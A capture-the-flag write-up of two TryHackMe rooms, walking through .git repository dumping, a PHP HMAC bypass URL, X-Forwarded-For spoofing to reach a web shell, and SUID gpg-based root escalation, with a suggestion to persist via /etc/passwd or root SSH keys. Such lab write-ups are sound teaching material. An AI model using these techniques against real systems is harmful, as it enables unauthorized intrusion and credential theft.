---
layout: default
tags: git web
---

# TryHackMe  - harder and git happens writeups

![Header image](/assets/images/thm_harder/thm_harder_header.png)

[harder room link](https://tryhackme.com/room/harder)
[git happens room link](https://tryhackme.com/room/harder)

:git: :computer:

## Introduction 

Welcome to a writeup about the TryHackMe `harder` room and as a bonus another `git happens` room. Both of these systems involve the use of `git` and how we can exploit it to gain sensitive information which can be used to bypass security features.

harder's authors notes.

> "The machine is completely inspired by real world pentest findings. Perhaps you will consider them very challenging but without any rabbit holes. Once you have a shell it is very important to know which underlying linux distribution is used and where certain configurations are located."

## Initial recon

### Nmap scan

We start with a TCP SYN version scan of all TCP ports and run default scripts against any open ports.
```
nmap -sS -sV -sC -O -p- -oA tcp_all_ports -vv 10.10.76.65
```

#### TCP Scan Results

```
# Nmap 7.80 scan initiated Mon Oct  5 08:25:08 2020 as: nmap -sS -sV -sC -O -p- -oA tcp_all_ports -vv 10.10.76.65
Increasing send delay for 10.10.76.65 from 0 to 5 due to 1917 out of 6388 dropped probes since last increase.
Nmap scan report for 10.10.76.65
Host is up, received reset ttl 63 (0.17s latency).
Scanned at 2020-10-05 08:25:08 EDT for 706s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT   STATE SERVICE REASON         VERSION
2/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f8:8c:1e:07:1d:f3:de:8a:01:f1:50:51:e4:e6:00:fe (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEFmFCa+IH2JigaT+Z8eV8W3N0cSDkslS33rwJ1tptuG0IvY5mvhC/bYiNO9vTigCiTgkHXKiFp0Kog0kiPPzihW3PU8HSpQHuSAH27vRsKR9mHY24rj7PA2mPxjObkD6PqS4Yq2YVK6BKV3RY+dYIIe0nbqFNyB/QiK7+EXXHrQLnboMy35uXfM2vy02XJxDRlhd/lyepiMXWVdTo2LHgnjL8bl9oiRzIYEtYzXg7jQErNamPwes4fqokd4Di+ma5zmeCxYfu+75/E49gvQEwwUUWJNbjAokOe8XKUwZsJsoUcJAMqn/gk0HAVZ4rdHqziWTYIGSsNeTJHyX7vB3r
|   256 e6:5d:ea:6c:83:86:20:de:f0:f0:3a:1e:5f:7d:47:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtXi31P1Ad+O7K71zZTGscq53c+5mUQTA/KxVNEc1Xm3I/7ubkunbVoR4MWt5v4SrYZnVB7iUbjXWiwmzRnwOw=
|   256 e9:ef:d3:78:db:9c:47:20:7e:62:82:9d:8f:6f:45:6a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKRvDffPpS8dq2oJcYvNPU2NzZtjbVppVt1wM8Y52P/i
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    syn-ack ttl 62 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
|_http-title: Error
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/5%OT=2%CT=1%CU=32641%PV=Y%DS=2%DC=I%G=Y%TM=5F7B1366
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=10
OS:4%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3
OS:=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F
OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW
OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 47.178 days (since Wed Aug 19 04:20:47 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  5 08:36:54 2020 -- 1 IP address (1 host up) scanned in 706.53 seconds
```

There are only 3 TCP ports open on this system. Two SSH ports running different versions of OpenSSH which is strange and a nginx web server on port 80.

## Web Server Enumeration

Visiting the web server we are greeted with a `404 Nothing Here` message on the web page.

Start bupsuite proxy up and intercept the GET request to the homepage and inspect the response headers further and we find a `Set-Cookie` header with a value that refers to a domain called `pwd.harder.local`.

![harder web server error and burpsuite](/assets/images/thm_harder/thm_harder_web_1.jpg)

So lets add this domain to our `/etc/hosts` file as it seems that the host system has virtual hosting enabled.
```
#Add an entry to the /etc/hosts file, remember to change the IP address to the victim system IP address
10.10.76.65    pwd.harder.local
```

Now when we visit `pwd.harder.local` we see a login form. Trying a common username and password combination on `admin` for both allows us in and we are greeted with a message
> extra security in place. our source code will be reviewed soon ...

![login page](/assets/images/thm_harder/thm_harder_web_2.jpg)

Instead of searching directories manually on the web server lets use `gobuster`

### Gobuster scan

A good wordlist to use is `/usr/share/dirb/wordlists/common.txt`, if you inspect the webserver and the source code you will know that it is running php so thus we can also add to look for files with the `.php` extension and then we save our scan results to a file.
```
sudo gobuster dir -u http://pwd.harder.local/ -w /usr/share/dirb/wordlists/common.txt -t 50 -x php -o gobuster_common__scan.txt
```

![gobuster scan](/assets/images/thm_harder/thm_harder_gobuster_scan.jpg)

As you can see from the results there are a few points on interest, the main one being the `./git/HEAD` results that indicates that this web server is hosting a git repository.

We can use one of the following tools to download/dump and try recover the contents on the repository so we can inspect it for sensitive information.
* [git-dumper](https://github.com/arthaud/git-dumper)
* [GitTools](https://github.com/internetwache/GitTools)

Lets use `git-dumper` to get the contents of the .git directory.
```
# clone the git-dumper repo if you dont have the tool
https://github.com/internetwache/GitTools

# cd into the repo and then execute the requirements.txt to install dependencies
sudo pip install -r requirements.txt

# run the script with the location of the .git directory and the place where you wish to download the contents to locally
sudo python3 git-dumper.py http://pwd.harder.local/.git ~/Desktop/THM/harder/
```

Running the git-dumper.py script we are able to recover 3 php files.

![git php files](/assets/images/thm_harder/thm_harder_git_files.jpg)

The one of particular interest to us is `hmac.php` as this contains vulnerable custom crypto php logic. The code contains a vulnerability for bypassing an HMAC check. This blog post explains the particular details of the vulnerability nicely: [hmac vulnerability bug](https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up)

```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```

Essentially if we pass the following value for `n` into the url we can bypass the logic check and retrieve the secret.
```
http://pwd.harder.local/?n[]=&host=securify.nl&h=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5
```

![shell web page](/assets/images/thm_harder/thm_harder_web_3.jpg)

As you can see when we use the crafted link above we are greeted with a page that displays another domain URL and it contains a username and password.
> shell.harder.local

Add the new url to the /etc/hosts file again and use the credentials to login. When we do this we see the following message.
> Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed.

There seems to be some sort of IP restriction the web server is enforcing. A common way of doing this is via the `X-Forwarded-For` HTTP header.

> The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. When traffic is intercepted between clients and servers, server access logs contain the IP address of the proxy or load balancer only. To see the original IP address of the client, the X-Forwarded-For request header is used.
[Source](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)

We can use Burp Suite again to intercept the request to shell.harder.local and add the `X-Forwarded-For` header to the request with an IP that fall within the 10.10.10.0/24 range.This then displays the Web Shell which then allows us to execute certain commands on the victim system.

![Burp Suite Header add](/assets/images/thm_harder/thm_harder_web_4.jpg)

Lets use Burp Suites repeater to send commands to the victim machine. Remember to have your `X-Forwarded-For` header set to the correct IP address and ensure you have a valid PHPSSESID cookie set by login in to web shell using the credentials we found earlier.

! Note: I tried to start a reverse shell on the victim system to no avail using the standard reverse shell one lines. Thus we need to enumerate the machine further to find any sensitive information.

Enumeration commands that lead to sensitive ssh credentials.
```
# First check which user we are running as.
id

# Find all files that the www user owns.
find / -type f -user www 2>/dev/null

# Inspecting the above files we find one file that is not standard that seems to be some sort of custom backup script so lets cat it out.
cat /etc/periodic/15min/evs-backup.sh

# You can also crab the user.txt file via this web shell.
cat /home/evs/user.txt
```

![Burp Suite](/assets/images/thm_harder/thm_harder_burp_suite_1.jpg)

The `/etc/periodic/15min/evs-backup.sh` file contains ssh credentials for the user `evs`.

## Privilege Escalation

We login to the machine as evs and now need to get root access somehow.

Checking for binaries with the SUID set reveals an interesting binary file and when we run it it seems to run as root and will allow us to run commands as long as we can find the gpg key to pass to it.

```
find / -perm -u=s -type f 2>/dev/null
```

![SUID binary](/assets/images/thm_harder/thm_harder_priv_esc_1.jpg)

In order to use the gpg key we first need to import it with the command below.
```
gpg --import /var/backup/root@harder.local.pub
```

Check it it worked by using the following command
```
gpg --list-keys
```

![gpg key import](/assets/images/thm_harder/thm_harder_priv_esc_2.jpg)

Now according the ouput of the `execute-crypted` binary we need to create a file that contains a command and then encrypt it. So lets create a file called `command1` and make it cat the contents of the root.txt file.
```
echo "cat /root/root.txt" > command1
```

Next we need to encrypt the command file using gpg command below. -e for encrypt and -r for recipient 
```
gpg -e -r "root@harder" command1
```

This should create the encrypted gpg command file called command1.gpg which we can then use to run with the SUID binary

```
/usr/local/bin/execute-crypted command1.gpg
```

As you can see it outputs the contents of the root.txt file as it is running as the root user.

![gpg running encrypted command as root](/assets/images/thm_harder/thm_harder_priv_esc_3.jpg)

If you wish to gain a shell on the system as root you can add another encrypted command that either adds a user to the /etc/passwd file or create a ssh key for the root user and add it to /root/.ssh/authorized_keys.

## Bonus: git happens

For a bonus lets hack another TryHackMe room called `git happens` that also involves the use of git.

> "Can you find the password to the application?"

This machines involves enumerating another .git website repository and finding the password to login. We will use [GitTools](https://github.com/internetwache/GitTools) to dump the git repo and also extract and gather commit information. Then using default git commands to inspect commits manually.

### Initial recon

### Nmap scan

We start with a TCP SYN version scan of all TCP ports and run default scripts against any open ports.
```
sudo nmap -sS -sV -sC -O -p- -vv -oA tcp_all_ports 10.10.173.198
```

#### TCP Scan Results

```
# Nmap 7.80 scan initiated Mon Oct  5 13:24:03 2020 as: nmap -sS -sV -sC -O -p- -vv -oA tcp_all_ports 10.10.173.198
Nmap scan report for 10.10.173.198
Host is up, received reset ttl 63 (0.17s latency).
Scanned at 2020-10-05 13:24:03 EDT for 1169s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.173.198:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/5%OT=80%CT=1%CU=36698%PV=Y%DS=2%DC=I%G=Y%TM=5F7B5B4
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M5
OS:08ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O
OS:6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D
OS:F=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 13.920 days (since Mon Sep 21 15:38:34 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  5 13:43:32 2020 -- 1 IP address (1 host up) scanned in 1170.02 seconds
```

### Enumeration

The nmap scan reveals that there is only 1 ports open running an nginx web server. An import bit of information is that it states it also found a git repository. 

**Note -** this was discovered easily because we enabled the default script scan using the -sC flag on the nmap scan.
```
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.173.198:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
```

We could have also used a gobuster scan that would have also revealed the `.git` directory on the web server as log as the word list contains the .git entry.
```
gobuster dir -u http://10.10.174.198 -w /usr/share/dirb/wordlists/common.txt -t 50
```

Inspecting the default landing web page we are presented with a login page. If you inspect the source code you will find within the `<script>` tags there is a const variable assigned that appears to have obfuscated code. Now you could try to manually try to decrypt the code but this would take some time and seems to be a deep rabbit whole, so lets not go down that path. Instead lets see what we can find in the `.git` directory

![git happens web login](/assets/images/thm_harder/thm_git_happens_web_1.jpg)

![git directory](/assets/images/thm_harder/thm_git_happens_web_2.jpg)

I first tried to download the repository using [git-dumper](https://github.com/arthaud/git-dumper) but for some reason it did not work. So I found another some better scripts called [GitTools](https://github.com/internetwache/GitTools).

Clone the repo to download the scripts to your attacking machine
```
sudo git clone https://github.com/internetwache/GitTools.git 
```

Now lets first use the `gitdumper.sh` script to download the git repository to our local attacking machine.
> This tool can be used to download as much as possible from the found .git repository from web servers which do not have directory listing enabled.
```
./gitdumper.sh http://10.10.173.198/.git/ ~/Desktop/THM/git_happens/git2
```

![GitTools dumper](/assets/images/thm_harder/thm_git_happens_gittools_1.jpg)


Next we will use the `extractor.sh` script to get all the commit information for the git repo.
> A small bash script to extract commits and their content from a broken repository.
```
./extractor.sh ~/Desktop/THM/git_happens/git2 ~/Desktop/THM/git_happens/git2
```

![GitTools Extractor](/assets/images/thm_harder/thm_git_happens_gittools_2.jpg)

#### Enumerating the git repository

Once we have downloaded everything we can from the .git directory to our local attacking machine lets navigate to the folder where its located and execute the following git commands to see what we can find.

Lets inspect the git log to see information on all the commits.
```
git log
```

![git log](/assets/images/thm_harder/thm_git_happens_git_log_1.jpg)

Each commit contains the the commit guid, author, date and comment. Reading the commit comments we can see that the user `Hydragyrum` made a login page and the proceeded to obfuscate the code multiple times to secure it. 

Lets inspect the initial commit `395e087334d613d5e423cdf8f7be27196a360459` code to see what the code looks like before all the obfuscation.

Use the following command to change to this commit code so we can inspect it.
```
git checkout 395e087334d613d5e423cdf8f7be27196a360459
```

You can also use the git `diff` command to see the differences between different commits. This will highlight the changes in the code and you can also find the username and password via this method.

```
git diff 395e087334d613d5e423cdf8f7be27196a360459
```

![checking out commit](/assets/images/thm_harder/thm_git_happens_git_commit_1.jpg)

Once you checkout the commit branch, navigate to the source code directory and inspect the index.html code. We find the username and password in there that allows us to login to the web site and we are presented with the following message.

> Awesome! Use the password you input as the flag!

![index.html source code](/assets/images/thm_harder/thm_git_happens_git_commit_2.jpg)


## Notes

These systems highlighted the inherit risks and vulnerabilities one can encounter if there is poor configuration and practices of .git repositories. 

As a general rule of thumb for good software development practices the following guidelines should be followed.
* Never expose source code that contains sensitive information that is production critical.
* Never commit in clear text production keys and passwords.
* If keys and other sensitive credentials are stored in a repository they should generally be encrypted or protected via environment variables for example.
* Git commit los files should be cleared of any clear text production critical keys and passwords.

**GitTools** appears to be much better than **git-dumper** as it could download the repo, extract commit information and even has another finder script that can find websites with their .git repository available to t he public on the web.

### X-Forwarded-For security code check

This is the code responsible for enforcing the IP security check on index.php webpage on the url http://shell.harder.local/index.php on the harder system.

> harder:/www/shell$ cat ip.php
```php
<?php

if (empty($_SERVER['HTTP_X_FORWARDED_FOR'])){ 
 $x_header = "";
} else {
 $x_header = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
if (strpos($x_header, "10.10.10.") === false) {
 print("Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed");
 die();
}
?>
```

## References

* https://tryhackme.com/ 
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
* https://github.com/internetwache/GitTools
* https://github.com/arthaud/git-dumper